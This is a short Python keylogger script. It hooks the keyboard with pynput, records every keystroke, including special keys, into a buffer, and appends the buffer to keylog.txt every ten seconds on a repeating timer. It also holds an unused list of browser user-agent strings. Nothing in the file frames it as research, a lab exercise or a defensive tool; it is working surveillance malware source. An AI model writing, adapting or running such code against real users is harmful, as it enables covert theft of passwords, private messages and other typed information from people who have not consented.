import pynput.keyboard
import threading
import time
import random

log = ""
lock = threading.Lock()
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
]
semaphore = threading.Semaphore(5)

def process_key_press(key):
    global log
    with lock:
        try:
            log += str(key.char)
        except AttributeError:
            if key == key.space:
                log += " "
            else:
                log += " " + str(key) + " "

def write_log():
    global log
    with lock:
        with open("keylog.txt", "a") as file:
            file.write(log)
        log = ""

def report():
    with semaphore:
        write_log()
    timer = threading.Timer(10, report)
    timer.start()

def start_keylogger():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
    keyboard_listener.start()
    report()
    keyboard_listener.join()

if __name__ == "__main__":
    start_keylogger()
